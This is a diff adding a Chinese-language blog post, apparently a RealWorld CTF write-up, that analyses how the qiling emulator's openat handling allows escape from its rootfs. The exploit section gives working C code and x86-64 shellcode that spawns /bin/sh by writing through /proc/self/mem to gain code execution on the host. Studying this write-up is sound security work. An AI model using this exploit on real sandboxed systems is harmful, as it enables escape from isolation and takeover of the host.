@@ -1349,6 +1349,291 @@ P.S.我们需要知道你需要什么样的Node，进行什么样的操作，Nod
       </tags>
   </entry>
   <entry>
+    <title>RealWorld CTF之qiling框架分析</title>
+    <url>//post/Qilin%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90.html</url>
+    <content><![CDATA[RealWorld CTF之qiling框架分析qiling​当时题目就给了一个qiling的使用的用例，甚至和官方文档上面的用例差不多因此肯定是库的问题。
+#!/usr/bin/env python3
+
+import os
+import sys
+import base64
+import tempfile
+# pip install qiling==1.4.1
+from qiling import Qiling
+
+def my_sandbox(path, rootfs):
+    ql = Qiling([path], rootfs)
+    ql.run()
+
+def main():
+    sys.stdout.write('Your Binary(base64):\n')
+    line = sys.stdin.readline()
+    binary = base64.b64decode(line.strip())
+    
+    with tempfile.TemporaryDirectory() as tmp_dir:
+        fp = os.path.join(tmp_dir, 'bin')
+
+        with open(fp, 'wb') as f:
+            f.write(binary)
+
+        my_sandbox(fp, tmp_dir)
+
+if __name__ == '__main__':
+    main()
+
+大致分析qiling源代码发现其加载模拟文件的流程如下（可以看qiling项目core.py文件，其中实现了一个Qiling的类）：
+
+在实例初始化阶段设置一系列基础信息比如当前平台的操作系统及其架构等。
+设置运行参数
+设置需要的roofs目录，这里也是出问题的一个关键点
+设置操作系统和结构
+设置大小端序和机器长度
+初始化QlCoreStructs结构体，主要是用来pack的
+加载loader，主要就是根据os type导入loader文件夹下的不同文件。
+log日志操作
+加载qiling自己实现的内存管理器和寄存器管理器（这个根据interpreter成员来决定是否加载）
+根据不同arch架构来加载qiling自己的实现的arch，就在目录的arch下
+根据interpreter成员来决定是否初始化QlCoreHooks
+启动之前加载loader，加载目标（linux的话里面其实实现了ELF的解析以及加载到内存的整个过程，甚至如果提供了interpreter也可以进行加载，详情可以看loader文件夹下的elf.py），然后起了一个守护页，看注释应该是保护内存的，至此初始化工作完成。
+根据interpreter成员来决定是否选择不同的执行模式，一般直接初始化osHook通过os运行目标文件
+
+上面是大致的加载过程，下面分析一下文件是怎么运行起来的（以模拟linux操作系统为例），运行的方式大致是分为运行qiling独立实现的解释器和不使用qiling独立实现的解释器两种，（作者大佬说是区块链智能合约解释器，这块我不是很懂，好像是智能合约bytecode执行，这里主要说os run）
+在QlOsLinux类里面找到相应的run函数：
+    def run(self):
+        if self.ql.exit_point is not None:
+            self.exit_point = self.ql.exit_point
+
+        try:
+            if self.ql.code:
+                self.ql.emu_start(self.entry_point, (self.entry_point + len(self.ql.code)), self.ql.timeout, self.ql.count)
+            else:
+                if self.ql.multithread == True:
+                    # start multithreading
+                    thread_management = thread.QlLinuxThreadManagement(self.ql)
+                    self.ql.os.thread_management = thread_management
+                    thread_management.run()
+
+                else:
+                    if  self.ql.entry_point is not None:
+                        self.ql.loader.elf_entry = self.ql.entry_point
+
+                    elif self.ql.loader.elf_entry != self.ql.loader.entry_point:
+                        entry_address = self.ql.loader.elf_entry
+                        if self.ql.archtype == QL_ARCH.ARM and entry_address &amp; 1 == 1:
+                            entry_address -= 1
+                        self.ql.emu_start(self.ql.loader.entry_point, entry_address, self.ql.timeout)
+                        self.ql.enable_lib_patch()
+                        self.run_function_after_load()
+                        self.ql.loader.skip_exit_check = False
+                        self.ql.write_exit_trap()
+
+                    self.ql.emu_start(self.ql.loader.elf_entry, self.exit_point, self.ql.timeout, self.ql.count)
+
+看了看emu_start，主要是利用unicorn进行模拟执行的。然后看了看linux OS的初始化，总结下来觉得qiling实现的东西还是很多的，比如自己的os loader，arch，syscall，hook等，以x86_64架构下的linux为例子看其是如何加载自己的syscall的。
+        # X8664
+        elif self.ql.archtype == QL_ARCH.X8664:
+            self.gdtm = GDTManager(self.ql)
+            ql_x86_register_cs(self)
+            ql_x86_register_ds_ss_es(self)
+            self.ql.hook_insn(self.hook_syscall, UC_X86_INS_SYSCALL)
+            # Keep test for _cc
+            #self.ql.hook_insn(hook_posix_api, UC_X86_INS_SYSCALL)
+            self.thread_class = thread.QlLinuxX8664Thread     
+            
+def hook_syscall(self, ql, intno = None):
+        return self.load_syscall()
+
+load_syscall本身比较复杂，通过代码可以看出它都实现了那些syscall，这里的大部门都是直接使用的系统底层的一些syscall，并不是麒麟自己实现的，可以看他的load_syscall函数实现，不过在posix文件夹下的syscall文件夹里面发现其实qiling自己也实现了大量的syscall，这俩种syscall在使用时的区别主要在于要模拟的文件源码中是直接使用的syscall还是类似open的这种函数形式，前者会调用qiling自身实现的，后者则会直接调用对应的系统调用（这块基于推理和调试，不过大致qiling的系统调用就是通过hook进行检测然后通过回调调用对应的代码这样子），调用回溯如下：
+
+其实从上面就可以看出，qiling本身实现的功能还是很多的，比如内存管理，动态模拟不同架构等，但是根据从大佬哪里偷来的经验，首先像python这种高级语言，内存出现问题是很不常见的，大多都是逻辑问题，那么就很可能是实现跟底层系统进行交互的设计出现问题，比如实现的syscall，这也是rwctf的考点。
+漏洞分析​以qiling实现的ql_syscall_open为例子：
+def ql_syscall_open(ql: Qiling, filename: int, flags: int, mode: int):
+    path = ql.os.utils.read_cstring(filename)
+    real_path = ql.os.path.transform_to_real_path(path)
+    relative_path = ql.os.path.transform_to_relative_path(path)
+    flags &amp;= 0xffffffff
+    mode &amp;= 0xffffffff
+
+    idx = next((i for i in range(NR_OPEN) if ql.os.fd[i] == 0), -1)
+    if idx == -1:
+        regreturn = -EMFILE
+    else:
+        try:
+            if ql.archtype== QL_ARCH.ARM and ql.ostype!= QL_OS.QNX:
+                mode = 0
+            #flags = ql_open_flag_mapping(ql, flags)
+            flags = ql_open_flag_mapping(ql, flags)
+            ql.os.fd[idx] = ql.os.fs_mapper.open_ql_file(path, flags, mode)
+            regreturn = idx
+        except QlSyscallError as e:
+            regreturn = - e.errno
+    ql.log.debug("open(%s, 0o%o) = %d" % (relative_path, mode, regreturn))
+
+    if regreturn &gt;= 0 and regreturn != 2:
+        ql.log.debug(f'File found: {real_path:s}')
+    else:
+        ql.log.debug(f'File not found {real_path:s}')
+
+    return regreturn
+
+首先通过绝对路径获取模拟执行文件在rootfs下的相对路径，然后将flags传递给ql_open_flag_mapping，然后进行open操作，将得到的fd通过idx索引进行一个存储。
+其大致的函数调用链如下：
+
+ql_syscall_open –&gt;  open_ql_file —&gt; os.open
+
+    def open_ql_file(self, path, openflags, openmode, dir_fd=None):
+        if self.has_mapping(path):
+            self.ql.log.info(f"mapping {path}")
+            return self._open_mapping_ql_file(path, openflags, openmode)
+        else:
+            if dir_fd:
+                return ql_file.open(path, openflags, openmode, dir_fd=dir_fd)
+
+            real_path = self.ql.os.path.transform_to_real_path(path)
+            return ql_file.open(real_path, openflags, openmode)
+
+在open_ql_file这里发现可能存在漏洞，函数首先判断文件是否已经打开过了，然后判断是否存在dir_fd，如果不存在的话会调用transform_to_real_path函数，该函数也是实现模拟器文件系统隔离的一个关键，这里面对符号链接文件进行了多重解析，但是好像没对路径进行判断，应该也会出现链接的目标问题，它返回一个文件在系统上面的真实路径，然后由open打开相关文件。
+    def transform_to_real_path(self, path: str) -&gt; str:
+        real_path = self.convert_path(self.ql.rootfs, self.cwd, path)
+
+.......
+
+        return str(real_path.absolute())
+
+但是真正的隔离其实是convert_path实现的：
+    @staticmethod
+    def convert_for_native_os(rootfs: Union[str, Path], cwd: str, path: str) -&gt; Path:
+        _rootfs = Path(rootfs)
+        _cwd = PurePosixPath(cwd[1:])
+        _path = Path(path)
+
+        if _path.is_absolute():
+            return _rootfs / QlPathManager.normalize(_path)
+        else:
+            return _rootfs / QlPathManager.normalize(_cwd / _path.as_posix())
+
+    def convert_path(self, rootfs: Union[str, Path], cwd: str, path: str) -&gt; Path:
+        emulated_os = self.ql.ostype
+        hosting_os = self.ql.platform_os
+
+        # emulated os and hosting platform are of the same type
+        if  (emulated_os == hosting_os) or (emulated_os in QL_OS_POSIX and hosting_os in QL_OS_POSIX):
+            return QlPathManager.convert_for_native_os(rootfs, cwd, path)
+
+        elif emulated_os in QL_OS_POSIX and hosting_os == QL_OS.WINDOWS:
+            return QlPathManager.convert_posix_to_win32(rootfs, cwd, path)
+
+        elif emulated_os == QL_OS.WINDOWS and hosting_os in QL_OS_POSIX:
+            return QlPathManager.convert_win32_to_posix(rootfs, cwd, path)
+
+        else:
+            return QlPathManager.convert_for_native_os(rootfs, cwd, path)
+
+这里建立了rootfs，第一步肯定是想到的路径穿越，比如../../../../这种，但是实验发现../../../test也会被拼接成rootfs/test，原因在于convert_for_native_os函数中利用了normalize进行了处理，导致无法进行路径穿越：
+
+    def normalize(path: Union[Path, PurePath]) -&gt; Union[Path, PurePath]:
+        # expected types: PosixPath, PurePosixPath, WindowsPath, PureWindowsPath
+        assert isinstance(path, (Path, PurePath)), f'did not expect {type(path).__name__!r} here'
+
+        normalized_path = type(path)()
+
+        # remove anchor (necessary for Windows UNC paths) and convert to relative path
+        if path.is_absolute():
+            path = path.relative_to(path.anchor)
+
+        for p in path.parts:
+            if p == '.':
+                continue
+
+            if p == '..':
+                normalized_path = normalized_path.parent
+                continue
+
+            normalized_path /= p
+
+        return normalized_path
+
+符号链接就可以绕过检查，但是遗憾的是qiling没有实现symlink的系统调用，不过，回看open_ql_file的代码可以看出，如果dir_fd存在，那么就可以绕过这些检查，这时候自然就可以想到ql_syscall_openat的实现，这个就很简单，里面也没什么严格的检查，因此就可以实现目录穿越。
+漏洞利用​        在实现了目录穿越之后其实问题就变得简单了，我们可以通过/proc/self/maps获取到自身进程的内存信息，然后通过/proc/self/mem实现恶意代码执行，进而完成逃逸，这里展示一个小demo。
+#include&lt;stdio.h&gt;
+#include&lt;fcntl.h&gt;
+#include&lt;string.h&gt;
+unsigned char nop[] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+unsigned char code[] = "\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x1\x1\x81\x34\x24\x1\x1\x1\x1\x31\xf6\x56\x6a\x8\x5e\x48\x1\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\xf\x5";
+int main() {
+    char buf[4096] = "0";
+    int fd = open("/proc/self/maps", O_RDONLY);
+    int fd_mem = open("/proc/self/mem", O_RDWR);
+    FILE *fp_map = fdopen(fd, "r");
+    unsigned long addr = 0;
+    while(1) {
+        fgets(buf, sizeof buf, fp_map);
+        if (strstr(buf, "r-xp")!=NULL &amp;&amp; strstr(buf, "libc-")) {
+            sscanf(buf, "%lx-", &amp;addr);
+            break;
+        }
+    }
+    lseek(fd_mem, addr, SEEK_SET);
+    for (int i=0; i&lt;150; i++) {
+        write(fd_mem, nop, sizeof nop - 1);
+    }
+    write(fd_mem, code, sizeof code);
+    return 0;
+}
+
+不过大家可能会好奇，mem的权限为啥允许写入shellcode：
+
+答案可以参考这篇文章：
+
+https://www.anquanke.com/post/id/257350#h2-0
+
+至此，我们其实就拥有了整个攻击链，先进行目录穿越找到/proc/self/mem，然后写入shellcode。
+int main() {
+    long start_addr;
+
+    // Open mappings
+    int map = openat(1, "/proc/self/maps", O_RDONLY);
+
+    // Open Python process memory
+    int mem = openat(1, "/proc/self/mem", O_RDWR);
+    FILE *fp_map = fdopen(map, "r");
+
+    // Find the first executable mapping for Libc
+    char line[4096];
+    while (fgets(line, sizeof line, fp_map)) {
+        size_t len = strlen(line);
+        if (strstr(line, "r-xp") != NULL &amp;&amp; strstr(line, "libc-")) {
+            // Retrive start address of mapping
+            sscanf(line, "%lx-", &amp;start_addr);
+            printf("%lx\n", start_addr);
+            break;
+        }
+    }
+
+    // Seek to the address of the executable mapping for Libc
+    lseek(mem, start_addr, SEEK_SET);
+    for(int i=0; i &lt; 3; i++) {
+        write(mem, nop, sizeof nop -1);
+    }
+    // Write the payload into the executable mapping
+    write(mem, code, sizeof code);
+    return 0;
+}
+
+shellcode就不贴了，占地方，可以参考上面那个demo里面的。
+总结​这个题目本身算是一个容器逃逸的题目，qiling在实现自己的rootfs的时候对系统调用的检测不严格是问题的根源。官方也及时进行了修复：
+
+https://github.com/qilingframework/qiling/pull/1076/commits/6d0fc4a81880abc2984552ccd23497d8832d00fe
+
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Ubuntu 20.04更新内核到指定版本</title>
     <url>//post/Ubuntu20.04%20%E5%8D%87%E7%BA%A7%E9%99%8D%E7%BA%A7%E5%86%85%E6%A0%B8%E5%88%B0%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC.html</url>
     <content><![CDATA[记一次更新内核到5.8.0-33-generic
